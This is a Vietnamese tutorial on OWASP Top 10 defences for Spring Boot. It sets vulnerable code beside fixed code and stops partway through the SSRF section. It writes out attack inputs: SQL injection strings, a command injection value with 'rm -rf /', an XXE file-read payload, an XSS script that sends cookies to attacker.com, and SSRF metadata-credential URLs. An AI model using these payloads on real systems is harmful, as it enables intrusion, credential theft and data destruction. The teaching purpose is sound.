# Module 23 — Bảo mật ứng dụng nâng cao (OWASP Top 10)

> **Mức ưu tiên: 🔴 Cao**
> **Vì sao quan trọng:** Module 16 (Spring Security) đã cho bạn nền tảng Authentication/Authorization/JWT — module này mở rộng sang **toàn bộ các lớp lỗ hổng phổ biến nhất** mà OWASP (Open Web Application Security Project) tổng hợp từ hàng nghìn vụ tấn công thực tế trên toàn thế giới. Đây không phải kiến thức "để biết cho vui" — 1 lỗ hổng SQL Injection hay Broken Access Control có thể khiến toàn bộ dữ liệu người dùng bị đánh cắp, và là chủ đề bị soi kỹ trong mọi cuộc security audit/code review nghiêm túc.

> **Phạm vi bài này:** Bao quát các lớp lỗ hổng OWASP Top 10 liên quan trực tiếp tới code Backend Spring Boot. A04 (Insecure Design) và A07 (Identification & Authentication Failures) không có mục riêng — A07 đã học kỹ ở Module 16, còn A04 là nguyên tắc thiết kế tổng quát thấm xuyên suốt mọi mục dưới đây hơn là 1 lỗ hổng kỹ thuật cụ thể có thể demo bằng code.

---

## Mục lục

1. [OWASP Top 10 là gì?](#1-owasp-top-10-là-gì)
2. [A03: Injection (SQL Injection & các biến thể)](#2-a03-injection)
3. [A03: XSS (Cross-Site Scripting)](#3-a03-xss)
4. [CSRF nâng cao (bổ sung Module 16)](#4-csrf-nâng-cao)
5. [A01: Broken Access Control](#5-a01-broken-access-control)
6. [A05: Security Misconfiguration](#6-a05-security-misconfiguration)
7. [A08: Insecure Deserialization](#7-a08-insecure-deserialization)
8. [A02: Cryptographic Failures](#8-a02-cryptographic-failures)
9. [A06: Vulnerable and Outdated Components](#9-a06-vulnerable-and-outdated-components)
10. [A09: Security Logging & Monitoring Failures](#10-a09-security-logging--monitoring-failures)
11. [A10: Server-Side Request Forgery (SSRF)](#11-a10-server-side-request-forgery-ssrf)
12. [Checklist bảo mật cho Backend Developer](#12-checklist-bảo-mật-cho-backend-developer)
13. [⚠️ Các bẫy hay gặp](#13-các-bẫy-hay-gặp)
14. [Tổng kết — Bảng ghi nhớ nhanh](#14-tổng-kết--bảng-ghi-nhớ-nhanh)
15. [Bài tập luyện tập](#15-bài-tập-luyện-tập)

---

## 1. OWASP Top 10 là gì?

**OWASP (Open Web Application Security Project)** là tổ chức phi lợi nhuận chuyên nghiên cứu bảo mật ứng dụng web. **OWASP Top 10** là danh sách **10 lỗ hổng bảo mật phổ biến và nguy hiểm nhất**, được cập nhật định kỳ (phiên bản gần nhất: 2021) dựa trên dữ liệu thực tế từ hàng nghìn ứng dụng bị tấn công.

```
A01: Broken Access Control          <- Phổ biến NHẤT (mục 5)
A02: Cryptographic Failures         (mục 8)
A03: Injection                      <- SQL Injection, XSS (mục 2, 3)
A04: Insecure Design
A05: Security Misconfiguration      (mục 6)
A06: Vulnerable and Outdated Components (mục 9)
A07: Identification & Authentication Failures  <- Đã học ở Module 16
A08: Software and Data Integrity Failures (Insecure Deserialization - mục 7)
A09: Security Logging & Monitoring Failures (mục 10)
A10: Server-Side Request Forgery (SSRF)  (mục 11)
```

> **Đây KHÔNG phải danh sách "học thuộc để thi"** — mỗi mục là 1 **lớp lỗ hổng** với nguyên nhân gốc rễ và cách phòng chống cụ thể. Hiểu bản chất quan trọng hơn nhớ tên gọi.

---

## 2. A03: Injection

### SQL Injection — lỗ hổng kinh điển nhất trong lịch sử bảo mật web

**Nguyên nhân gốc rễ:** Nối chuỗi **trực tiếp** input của user vào câu lệnh SQL, khiến kẻ tấn công có thể "tiêm" thêm SQL logic của riêng họ.

```java
// ❌ CỰC KỲ NGUY HIỂM - Nối chuỗi input trực tiếp vào SQL
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
statement.executeQuery(query);
```

**Kịch bản tấn công:** Kẻ tấn công nhập vào ô `username`:
```
' OR '1'='1
```

Câu SQL thực tế trở thành:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
```

`'1'='1'` LUÔN ĐÚNG → điều kiện `WHERE` trở nên vô nghĩa → **trả về TẤT CẢ user trong bảng**, kẻ tấn công đăng nhập được **mà không cần biết password thật**.

**Kịch bản nguy hiểm hơn — DROP TABLE:**
```
username = "admin'; DROP TABLE users; --"
```
```sql
SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --' AND password = '...'
```
→ Nếu database driver cho phép **multiple statement**, toàn bộ bảng `users` bị **XÓA VĨNH VIỄN**.

### Giải pháp: Prepared Statement / Parameterized Query

```java
// ✅ AN TOÀN - Dùng PreparedStatement, tham số được "tách biệt" hoàn toàn khỏi câu lệnh SQL
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username); // Input được "escape" tự động, KHÔNG BAO GIỜ được hiểu là SQL code
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

⚠️ **Tin tốt cực kỳ quan trọng cho Backend Developer dùng Spring:** **JPA/Hibernate với JPQL và Derived Query Method** (đã học Module 11, 15) **TỰ ĐỘNG dùng Parameterized Query bên dưới** — đây là lý do dùng Spring Data JPA đúng cách gần như **miễn nhiễm** với SQL Injection **THÔNG THƯỜNG**:

```java
// ✅ AN TOÀN - JPQL với @Param, Hibernate tự parameterize
@Query("SELECT u FROM User u WHERE u.username = :username")
Optional<User> findByUsername(@Param("username") String username);

// ✅ AN TOÀN - Derived Query Method
Optional<User> findByUsername(String username);
```

⚠️ **NHƯNG vẫn có thể tự bắn vào chân mình** khi dùng **Native Query nối chuỗi thủ công**:

```java
// ❌ VẪN NGUY HIỂM dù đang dùng Spring Data JPA!
@Query(value = "SELECT * FROM users WHERE username = '" + "#{#username}" + "'", nativeQuery = true)
// Hoặc tệ hơn - build chuỗi native query bằng String concatenation trong code Java:
String sql = "SELECT * FROM users WHERE username = '" + username + "'"; // ❌ SAI dù đang trong Spring Boot
jdbcTemplate.queryForObject(sql, User.class);

// ✅ ĐÚNG - vẫn phải dùng named parameter/positional parameter ngay cả với Native Query
@Query(value = "SELECT * FROM users WHERE username = :username", nativeQuery = true)
Optional<User> findByUsernameNative(@Param("username") String username);

jdbcTemplate.queryForObject("SELECT * FROM users WHERE username = ?", new Object[]{username}, User.class);
```

> **Liên hệ Module 15 (Specification/Querydsl):** Cả 2 công cụ này khi dùng đúng cách (không tự String-concat giá trị vào) đều **tự động parameterize**, an toàn với SQL Injection.

### Command Injection & LDAP Injection — cùng nguyên lý, khác ngữ cảnh

```java
// ❌ Command Injection - nối input user vào lệnh SHELL
Runtime.getRuntime().exec("ping " + userInput);
// Kẻ tấn công nhập: "google.com; rm -rf /" -> thực thi lệnh XÓA TOÀN BỘ hệ thống!

// ✅ AN TOÀN - dùng ProcessBuilder với tham số TÁCH BIỆT (không qua shell interpreter)
ProcessBuilder pb = new ProcessBuilder("ping", userInput); // userInput được truyền như 1 ARGUMENT riêng,
                                                              // không bị shell "diễn giải" thành nhiều lệnh
```

### XXE (XML External Entity) — Injection ẩn trong việc parse XML

**Nguyên nhân gốc rễ:** Chuẩn XML cho phép khai báo **Entity bên ngoài (External Entity)** — nếu Backend parse XML từ nguồn không tin cậy mà **không tắt tính năng này**, kẻ tấn công có thể khiến parser đọc **file bất kỳ trên server** hoặc gọi request tới hệ thống nội bộ:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- Khai báo Entity trỏ tới file nhạy cảm trên server -->
]>
<user><name>&xxe;</name></user>
<!-- Nếu server parse và "diễn giải" &xxe;, nội dung file /etc/passwd sẽ bị NHÚNG vào response trả về -->
```

```java
// ❌ NGUY HIỂM - cấu hình mặc định của nhiều XML Parser CHO PHÉP External Entity
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder(); // Dễ bị khai thác XXE nếu input XML không tin cậy

// ✅ AN TOÀN - tắt tường minh External Entity và DOCTYPE
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

> **Liên hệ thực tế Spring Boot:** Ứng dụng REST API thuần JSON (không nhận XML từ client) gần như **miễn nhiễm tự nhiên** với XXE — lỗ hổng này chủ yếu xuất hiện ở API nhận XML (SOAP Web Service cũ, tích hợp hệ thống doanh nghiệp legacy, xử lý file upload dạng XML/SVG/DOCX). Nếu ứng dụng không có nhu cầu parse XML từ nguồn ngoài, không cần lo lắng nhiều — nhưng nếu có, đây là 1 trong những lỗ hổng bị bỏ sót nhiều nhất vì cấu hình mặc định của hầu hết XML Parser đều **KHÔNG an toàn**.

> **Nguyên tắc chung của MỌI loại Injection:** KHÔNG BAO GIỜ nối input user trực tiếp vào bất kỳ ngôn ngữ "lệnh" nào (SQL, Shell command, LDAP query, XPath...), và luôn tắt các tính năng "mở rộng nguy hiểm theo mặc định" (như External Entity của XML) — luôn dùng cơ chế tham số hóa (parameterization) hoặc cấu hình an toàn mà ngôn ngữ/thư viện đó cung cấp sẵn.

---

## 3. A03: XSS (Cross-Site Scripting)

**XSS** là lỗ hổng cho phép kẻ tấn công **chèn JavaScript độc hại** vào trang web, script này chạy trong trình duyệt của **NẠN NHÂN KHÁC** khi họ xem trang đó.

### Kịch bản tấn công — Stored XSS

```java
// Ứng dụng cho phép user viết bình luận (comment)
@PostMapping("/comments")
public void addComment(@RequestBody String content) {
    commentRepository.save(new Comment(content)); // Lưu THẲNG vào DB, KHÔNG xử lý gì
}
```

Kẻ tấn công gửi bình luận:
```html
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

Nếu Frontend **render trực tiếp** nội dung này (không escape HTML) → mỗi khi user KHÁC xem trang có bình luận này, script **TỰ ĐỘNG CHẠY** trong trình duyệt của họ, **đánh cắp Cookie/Session** và gửi về server của kẻ tấn công.

### 3 loại XSS

| Loại | Cơ chế | Ví dụ |
|---|---|---|
| **Stored XSS** | Script độc hại được LƯU vào DB, chạy mỗi khi có người xem trang | Bình luận, tên hiển thị, mô tả sản phẩm |
| **Reflected XSS** | Script nằm trong URL/Request, được "phản chiếu" NGAY vào response mà không lưu trữ | Link lừa đảo: `search?q=<script>...` |
| **DOM-based XSS** | Script chạy do JavaScript ở Frontend tự thao tác DOM không an toàn (không qua server) | Lỗi hoàn toàn ở tầng Frontend |

### Giải pháp — Output Encoding (Escape HTML)

```java
// ❌ Nguy hiểm - render trực tiếp
String html = "<div>" + userComment + "</div>";

// ✅ An toàn - Escape các ký tự đặc biệt HTML TRƯỚC KHI render
String safeComment = HtmlUtils.htmlEscape(userComment);
// "<script>" trở thành "&lt;script&gt;" -> trình duyệt hiển thị NHƯ VĂN BẢN, KHÔNG THỰC THI như code
```

**Vai trò của Backend trong việc phòng chống XSS:**
- Backend **KHÔNG PHẢI** nơi duy nhất chống XSS (Frontend/Template Engine cũng đóng vai trò quan trọng: React/Vue mặc định tự escape, Thymeleaf `th:text` tự escape) — nhưng Backend nên **validate và sanitize input** ngay từ đầu vào (defense in depth — phòng thủ nhiều lớp)
- Set **Content-Security-Policy (CSP) Header** — chỉ định RÕ nguồn nào được phép chạy script, chặn được nhiều biến thể tấn công XSS

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("script-src 'self'")) // CHỈ cho phép script từ CHÍNH domain của mình
    );
    return http.build();
}
```

⚠️ **Bẫy quan trọng:** Việc validate input (VD: `@Pattern`, `@Size` ở Module 14) giúp giảm bề mặt tấn công nhưng **KHÔNG THAY THẾ** được việc escape output. Dữ liệu hợp lệ (VD: tên "O'Brien <script>") vẫn cần được escape đúng cách khi hiển thị.

---

## 4. CSRF nâng cao

Module 16 đã giải thích CSRF là gì và vì sao JWT (Header) miễn nhiễm với nó. Ở đây bổ sung thêm các tình huống **KHÔNG THỂ tránh dùng Cookie** (VD: cần `httpOnly` Cookie để chống XSS đánh cắp token — 1 đánh đổi bảo mật thực tế).

### Khi VẪN PHẢI dùng Cookie (không dùng JWT trong Header) — vì sao?

**Lý do thực tế:** Lưu JWT trong `localStorage` (để gửi qua Header) dễ bị **đánh cắp bởi XSS** (JavaScript độc hại đọc được `localStorage`). Lưu JWT trong Cookie với cờ **`httpOnly`** khiến JavaScript **KHÔNG THỂ đọc được** Cookie đó — an toàn hơn trước XSS, nhưng lại **quay lại vấn đề CSRF** (vì Cookie tự động gửi kèm).

```java
// Set Cookie với các cờ bảo mật đầy đủ
ResponseCookie cookie = ResponseCookie.from("jwt", token)
        .httpOnly(true)      // JavaScript KHÔNG đọc được -> chống XSS đánh cắp token
        .secure(true)        // CHỈ gửi qua HTTPS -> chống nghe lén (man-in-the-middle)
        .sameSite("Strict")  // Chống CSRF - trình duyệt KHÔNG gửi Cookie này khi request tới từ site KHÁC
        .path("/")
        .maxAge(Duration.ofDays(7))
        .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

### SameSite Cookie Attribute — giải pháp CSRF hiện đại (bổ sung quan trọng cho Module 16)

| Giá trị `SameSite` | Cơ chế | Chống CSRF? |
|---|---|---|
| `Strict` | Cookie CHỈ gửi khi request xuất phát từ CHÍNH domain đó | ✅ Chống tốt nhất, nhưng ảnh hưởng UX (VD: click link từ email tới site → chưa có cookie) |
| `Lax` (mặc định của trình duyệt hiện đại) | Cookie gửi cho navigation thông thường (GET, click link), nhưng KHÔNG gửi cho request "ngầm" (form POST từ site khác, `<img>`, AJAX) | ✅ Cân bằng tốt giữa bảo mật và UX |
| `None` | Cookie LUÔN gửi kèm mọi request (kể cả cross-site) — PHẢI đi kèm `Secure` | ❌ Không chống CSRF — chỉ dùng khi thực sự cần (VD: widget nhúng iframe từ domain khác) |

> **Đây là lý do CSRF Token truyền thống ngày càng ít cần thiết:** Với `SameSite=Lax` (mặc định trình duyệt hiện đại từ 2020+) đã tự động chặn phần lớn kịch bản tấn công CSRF cổ điển (form tự động submit từ site khác) — dù vậy, **defense in depth** (dùng thêm CSRF Token cho các thao tác nhạy cảm) vẫn là thực hành tốt, không nên chỉ dựa vào 1 lớp phòng thủ duy nhất.

---

## 5. A01: Broken Access Control

**Đây là mục PHỔ BIẾN NHẤT trong OWASP Top 10 hiện nay** — không phải lỗi kỹ thuật phức tạp, mà là **lỗi logic phân quyền** cực kỳ dễ mắc phải.

### IDOR (Insecure Direct Object Reference) — lỗi Broken Access Control kinh điển nhất

```java
// ❌ NGUY HIỂM - Chỉ check user ĐÃ ĐĂNG NHẬP, KHÔNG check user có phải CHỦ SỞ HỮU của order này không
@GetMapping("/orders/{orderId}")
public OrderResponse getOrder(@PathVariable Long orderId) {
    Order order = orderRepository.findById(orderId).orElseThrow();
    return OrderResponse.from(order); // TRẢ VỀ dữ liệu dù order KHÔNG THUỘC VỀ user đang gọi API!
}
```

**Kịch bản tấn công:** User A đăng nhập hợp lệ, gọi `GET /orders/12` (order của chính họ) → thấy `orderId=12`. Họ chỉ cần **đổi số trên URL** thành `GET /orders/13` → nếu Backend không kiểm tra quyền sở hữu, họ xem được **order của user KHÁC** dù không có quyền — đây gọi là **IDOR**, cực kỳ phổ biến vì đơn giản tới mức nhiều Junior Developer bỏ sót.

### Giải pháp — LUÔN kiểm tra quyền sở hữu (Ownership Check)

```java
// ✅ AN TOÀN - Kiểm tra order THỰC SỰ thuộc về user đang gọi request
@GetMapping("/orders/{orderId}")
public OrderResponse getOrder(@PathVariable Long orderId, Authentication authentication) {
    Order order = orderRepository.findById(orderId)
            .orElseThrow(() -> new OrderNotFoundException(orderId));

    String currentUsername = authentication.getName();
    if (!order.getUser().getUsername().equals(currentUsername)) {
        throw new AccessDeniedException("Bạn không có quyền xem đơn hàng này"); // -> 403 (Module 14)
    }

    return OrderResponse.from(order);
}

// Hoặc dùng @PostAuthorize (đã học Module 16) - cách khai báo (declarative) rõ ràng hơn
@PostAuthorize("returnObject.user.username == authentication.name")
public OrderResponse getOrder(@PathVariable Long orderId) {
    Order order = orderRepository.findById(orderId).orElseThrow();
    return OrderResponse.from(order);
}
```

⚠️ **Bẫy tinh vi hơn: Mass Assignment (liên quan Broken Access Control):**

```java
// ❌ NGUY HIỂM - Bind TOÀN BỘ field từ request vào Entity, kể cả field KHÔNG NÊN cho user tự set
@PutMapping("/users/{id}")
public UserResponse updateProfile(@PathVariable Long id, @RequestBody User userUpdate) {
    // Nếu User Entity có field "role" (ADMIN/USER), và Frontend/Postman gửi thêm
    // {"fullName": "Pho", "role": "ADMIN"} -> user TỰ NÂNG QUYỀN của chính mình lên ADMIN!
    userRepository.save(userUpdate);
}

// ✅ AN TOÀN - Dùng DTO RIÊNG, CHỈ chứa field được phép user tự cập nhật
public record UserUpdateRequest(String fullName, String phone) {} // KHÔNG có field "role"

@PutMapping("/users/{id}")
public UserResponse updateProfile(@PathVariable Long id, @RequestBody UserUpdateRequest request) {
    User user = userRepository.findById(id).orElseThrow();
    user.setFullName(request.fullName()); // Chỉ set field ĐƯỢC PHÉP, "role" hoàn toàn không bị ảnh hưởng
    user.setPhone(request.phone());
    return UserResponse.from(userRepository.save(user));
}
```

> **Liên hệ trực tiếp Module 14 (DTO Design):** Đây chính là 1 trong những lý do **quan trọng nhất** vì sao luôn dùng DTO riêng cho Request thay vì bind trực tiếp vào Entity — không chỉ vì "gọn gàng", mà vì **lý do bảo mật cốt lõi**: DTO đóng vai trò như 1 "whitelist" — chỉ những field được khai báo tường minh mới có thể bị thay đổi.

---

## 6. A05: Security Misconfiguration

Lỗ hổng đến từ việc **cấu hình sai/thiếu cấu hình bảo mật**, không phải lỗi code trực tiếp.

### Các ví dụ Misconfiguration phổ biến

```yaml
# ❌ NGUY HIỂM - Expose toàn bộ Actuator endpoint (đã cảnh báo ở Module 13)
management:
  endpoints:
    web:
      exposure:
        include: "*"   # Bao gồm cả /actuator/env, /actuator/heapdump - rò rỉ thông tin nhạy cảm

# ✅ AN TOÀN - Chỉ expose những gì thực sự cần, và bảo vệ bằng Spring Security
management:
  endpoints:
    web:
      exposure:
        include: health, info
```

```java
// ❌ NGUY HIỂM - Bật debug/stacktrace chi tiết ở production (liên hệ Module 14)
server:
  error:
    include-stacktrace: always  // Lộ cấu trúc code, đường dẫn file, thư viện đang dùng cho MỌI người dùng

// ✅ AN TOÀN
server:
  error:
    include-stacktrace: never   // Production: KHÔNG bao giờ lộ stack trace ra ngoài
```

```java
// ❌ NGUY HIỂM - CORS cho phép MỌI origin (đã cảnh báo ở Module 16)
configuration.setAllowedOrigins(List.of("*"));

// ❌ NGUY HIỂM - Tài khoản/mật khẩu mặc định KHÔNG ĐỔI (VD: database admin/admin)
// -> Kẻ tấn công chỉ cần thử các credential mặc định phổ biến của phần mềm/framework

// ❌ NGUY HIỂM - Không cập nhật security patch cho framework/thư viện (liên hệ mục 9)
```

**Nguyên tắc cốt lõi: "Secure by Default" và "Principle of Least Privilege"**
- Mọi cấu hình MẶC ĐỊNH nên là **AN TOÀN NHẤT**, chỉ nới lỏng khi thực sự cần thiết (ngược lại với thói quen "mở hết cho dễ, siết lại sau" — thường KHÔNG BAO GIỜ được siết lại)
- Mỗi thành phần (user, service, container) chỉ nên có **QUYỀN TỐI THIỂU** cần thiết để hoạt động (VD: database user cho ứng dụng KHÔNG NÊN có quyền `DROP TABLE` nếu ứng dụng không bao giờ cần thao tác đó)

---

## 7. A08: Insecure Deserialization

**Deserialization** là quá trình chuyển đổi dữ liệu (bytes, JSON, XML) **trở lại thành Object** trong bộ nhớ. Nếu xử lý **KHÔNG AN TOÀN**, kẻ tấn công có thể "tiêm" dữ liệu độc hại được deserialize thành object thực thi mã tùy ý.

### Vấn đề với Java Native Serialization (`ObjectInputStream`)

```java
// ❌ CỰC KỲ NGUY HIỂM - Deserialize object từ nguồn KHÔNG TIN CẬY (VD: dữ liệu từ Client)
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
Object obj = ois.readObject();
// Nếu class trong classpath có "Gadget Chain" (chuỗi các phương thức được gọi liên tiếp
// trong quá trình deserialize dẫn tới thực thi mã tùy ý - kỹ thuật tấn công nổi tiếng),
// kẻ tấn công có thể THỰC THI MÃ TÙY Ý ngay trên server chỉ bằng cách gửi 1 byte stream được thiết kế đặc biệt!
```

> **Đây là lý do Java Native Serialization gần như bị coi là "deprecated về mặt bảo mật"** trong giới Backend hiện đại — hầu hết framework/thư viện hiện nay (bao gồm Spring Boot) ưu tiên hoàn toàn **JSON (qua Jackson)** thay vì Java Serialization cho giao tiếp qua mạng.

### JSON Deserialization cũng có thể có vấn đề (dù an toàn hơn nhiều)

```java
// ⚠️ Cẩn thận với Polymorphic Deserialization không kiểm soát
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) // ❌ NGUY HIỂM - cho phép JSON tự chỉ định CLASS BẤT KỲ để deserialize
public interface PaymentMethod { }
```

Nếu cấu hình cho phép JSON tự quyết định class nào được deserialize (`@JsonTypeInfo(use = Id.CLASS)` không giới hạn), kẻ tấn công có thể chỉ định 1 class **độc hại có sẵn trong classpath** (Gadget), tương tự vấn đề của Java Serialization, dù hiếm gặp hơn nếu dùng Jackson đúng cách.

```java
// ✅ AN TOÀN - Giới hạn RÕ RÀNG các subtype được phép, KHÔNG cho JSON tự quyết định class tùy ý
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = CreditCardPayment.class, name = "CREDIT_CARD"),
    @JsonSubTypes.Type(value = BankTransferPayment.class, name = "BANK_TRANSFER")
})
public interface PaymentMethod { }
```

**Nguyên tắc chung:** KHÔNG BAO GIỜ deserialize dữ liệu từ nguồn **không tin cậy** mà không có **whitelist rõ ràng** các type/class được phép.

---

## 8. A02: Cryptographic Failures

Đây là phần **mở rộng trực tiếp** kiến thức BCrypt đã học ở Module 16 — bao quát rộng hơn về mã hóa dữ liệu nói chung.

### Phân biệt Hashing vs Encryption — nhầm lẫn phổ biến

| | Hashing (VD: BCrypt) | Encryption (VD: AES) |
|---|---|---|
| Chiều | **1 CHIỀU** — không thể giải mã ngược lại | **2 CHIỀU** — có thể giải mã (decrypt) với đúng key |
| Dùng cho | Password (KHÔNG BAO GIỜ cần đọc lại password gốc) | Dữ liệu CẦN đọc lại sau này (số thẻ tín dụng, thông tin cá nhân cần hiển thị lại) |
| Ví dụ sai | Dùng AES để "mã hóa" password rồi lưu — SAI hoàn toàn về bản chất! | Dùng BCrypt để "mã hóa" số thẻ tín dụng cần hiển thị lại cho user — KHÔNG THỂ giải mã lại được! |

⚠️ **Bẫy khái niệm quan trọng:** Nhiều người (kể cả có kinh nghiệm) nói "mã hóa password" nhưng thực chất phải là **"băm (hash) password"** — 2 khái niệm hoàn toàn khác nhau về bản chất toán học và mục đích sử dụng.

### Dữ liệu nhạy cảm cần Encryption (không phải Hashing)

```java
// Dữ liệu như số thẻ tín dụng CẦN được đọc lại (để hiển thị 4 số cuối, xử lý giao dịch...)
// -> phải dùng ENCRYPTION (2 chiều), KHÔNG PHẢI hashing

@Convert(converter = AESEncryptionConverter.class) // JPA AttributeConverter tự động encrypt/decrypt
private String creditCardNumber;

public class AESEncryptionConverter implements AttributeConverter<String, String> {
    @Override
    public String convertToDatabaseColumn(String plainText) {
        return AESUtil.encrypt(plainText); // Mã hóa TRƯỚC khi lưu vào DB
    }

    @Override
    public String convertToEntityAttribute(String encryptedText) {
        return AESUtil.decrypt(encryptedText); // Giải mã KHI đọc từ DB (chỉ trong bộ nhớ ứng dụng)
    }
}
```

### Encryption in Transit vs at Rest

| | In Transit (đang truyền) | At Rest (đang lưu trữ) |
|---|---|---|
| Bảo vệ khỏi | Nghe lén trên đường truyền mạng | Truy cập trái phép vào file/database backup |
| Giải pháp | **HTTPS/TLS** (bắt buộc cho MỌI API production) | Mã hóa cột dữ liệu nhạy cảm, mã hóa toàn bộ ổ đĩa (Disk Encryption) |

⚠️ **HTTPS không phải "tùy chọn"** — bất kỳ API production nào truyền dữ liệu nhạy cảm (đăng nhập, thanh toán) mà KHÔNG dùng HTTPS đều bị coi là lỗ hổng bảo mật nghiêm trọng (dữ liệu, bao gồm cả JWT token, bị lộ hoàn toàn qua Man-in-the-Middle Attack).

---

## 9. A06: Vulnerable and Outdated Components

**Vấn đề:** Ứng dụng Spring Boot hiện đại phụ thuộc vào **HÀNG TRĂM thư viện bên thứ 3** (transitive dependencies) — chỉ cần **1 thư viện** trong số đó có lỗ hổng đã biết (CVE — Common Vulnerabilities and Exposures), toàn bộ ứng dụng có nguy cơ bị khai thác, dù code CỦA BẠN hoàn toàn không có lỗi.

### Công cụ quét lỗ hổng dependency

```xml
<!-- OWASP Dependency-Check Maven Plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <executions>
        <execution>
            <goals><goal>check</goal></goals>
        </execution>
    </executions>
</plugin>
```

```bash
mvn dependency-check:check
# Quét TOÀN BỘ dependency (kể cả transitive), đối chiếu với NVD (National Vulnerability Database)
# -> Báo cáo CVE nào đang tồn tại trong project, mức độ nghiêm trọng (CVSS Score)
```

**Thực hành tốt:**
- Tích hợp quét dependency vào CI Pipeline (liên hệ Module 20) — tự động cảnh báo khi có CVE mới phát hiện
- **Cập nhật thường xuyên** (không đợi tới khi bị tấn công mới update) — nhưng cũng cần kiểm tra kỹ (test đầy đủ — Module 17) trước khi update version lớn (tránh breaking change)
- Dùng **Dependabot** (GitHub) hoặc **Renovate Bot** — tự động tạo Pull Request khi có dependency mới có bản vá bảo mật

> **Ví dụ thực tế nổi tiếng:** Lỗ hổng **Log4Shell (CVE-2021-44228)** trong thư viện Log4j — 1 lỗ hổng Insecure Deserialization/RCE (Remote Code Execution) trong thư viện logging cực kỳ phổ biến, ảnh hưởng **hàng triệu ứng dụng Java trên toàn thế giới**, gây chấn động ngành bảo mật năm 2021 — minh chứng rõ ràng nhất cho tầm quan trọng của việc theo dõi lỗ hổng ở TẦNG DEPENDENCY, không chỉ ở code của riêng mình.

---

## 10. A09: Security Logging & Monitoring Failures

Liên hệ trực tiếp Module 21 (Observability) — nhưng dưới góc độ **bảo mật cụ thể**: nếu không ghi log đầy đủ các **sự kiện liên quan bảo mật**, không thể phát hiện/điều tra khi có tấn công xảy ra.

### Các sự kiện BẮT BUỘC phải log (Security Audit Log)

```java
@Component
public class SecurityAuditLogger {

    public void logFailedLogin(String username, String ipAddress) {
        log.warn("SECURITY_EVENT: Đăng nhập thất bại - username={}, ip={}", username, ipAddress);
    }

    public void logAccessDenied(String username, String resource) {
        log.warn("SECURITY_EVENT: Truy cập bị từ chối - user={}, resource={}", username, resource);
    }

    public void logPrivilegeEscalationAttempt(String username, String attemptedRole) {
        log.error("SECURITY_EVENT: Nghi ngờ cố gắng nâng quyền - user={}, attemptedRole={}", username, attemptedRole);
    }

    public void logPasswordChange(String username) {
        log.info("SECURITY_EVENT: Đổi mật khẩu thành công - user={}", username);
    }
}
```

**Các sự kiện cần theo dõi:**
- Đăng nhập thất bại (**đặc biệt nhiều lần liên tiếp cùng 1 IP/username** — dấu hiệu Brute-force attack)
- Truy cập bị từ chối (403) lặp lại (dấu hiệu dò quét/khai thác IDOR)
- Thay đổi quyền/role của user
- Truy cập vào dữ liệu nhạy cảm (VD: admin xem thông tin tài chính của user khác)

### Kết hợp với Alerting (đã học Module 21)

```yaml
# Alert rule ví dụ - phát hiện Brute-force
- alert: PossibleBruteForceAttack
  expr: |
    sum(rate(login_failed_total[5m])) by (username) > 10
  for: 1m
  annotations:
    summary: "Phát hiện > 10 lần đăng nhập thất bại/5 phút cho user {{ $labels.username }}"
```

> **Nguyên tắc quan trọng:** Log bảo mật KHÔNG chỉ để "xem lại khi có sự cố" — nên kết hợp với **Alerting chủ động** (Module 21) để phát hiện tấn công **ĐANG DIỄN RA**, không phải chỉ điều tra SAU KHI đã xảy ra thiệt hại.

---

## 11. A10: Server-Side Request Forgery (SSRF)

**SSRF** xảy ra khi ứng dụng Backend **thực hiện request HTTP tới 1 URL do CHÍNH USER cung cấp** — kẻ tấn công lợi dụng để buộc **server** (không phải trình duyệt của nạn nhân) gửi request tới nơi mà bình thường họ **không thể truy cập trực tiếp** (mạng nội bộ, Cloud Metadata Service...).

### Kịch bản điển hình — tính năng "Preview link" / "Tải ảnh từ URL"

```java
// ❌ NGUY HIỂM - Server tự động fetch BẤT KỲ URL nào user cung cấp, không kiểm soát
@PostMapping("/import-image")
public ImageResponse importFromUrl(@RequestParam String imageUrl) {
    byte[] imageBytes = restTemplate.getForObject(imageUrl, byte[].class); // Server gọi TỚI URL bất kỳ!
    return imageService.save(imageBytes);
}
```

**Kịch bản tấn công:** Thay vì gửi 1 URL ảnh hợp lệ, kẻ tấn công gửi:

```
POST /import-image?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

→ `169.254.169.254` là địa chỉ **Cloud Metadata Service** nội bộ (AWS/GCP/Azure) — chỉ server (không phải người dùng bên ngoài) mới gọi được — trả về **credential/IAM Role** của chính server đó. Server (đóng vai trò "con rối") vô tình fetch và trả nội dung nhạy cảm này về cho kẻ tấn công, dù chính kẻ tấn công **không bao giờ truy cập trực tiếp** được địa chỉ nội bộ đó.

```
Các mục tiêu SSRF phổ biến khác:
- http://localhost:8080/actuator/env  -> Đọc cấu hình nội bộ của CHÍNH server (liên hệ mục 6)
- http://internal-admin-service:9000/  -> Truy cập service nội bộ không expose ra Internet
- file:///etc/passwd                   -> Đọc file hệ thống (nếu thư viện HTTP client hỗ trợ scheme file://)
```

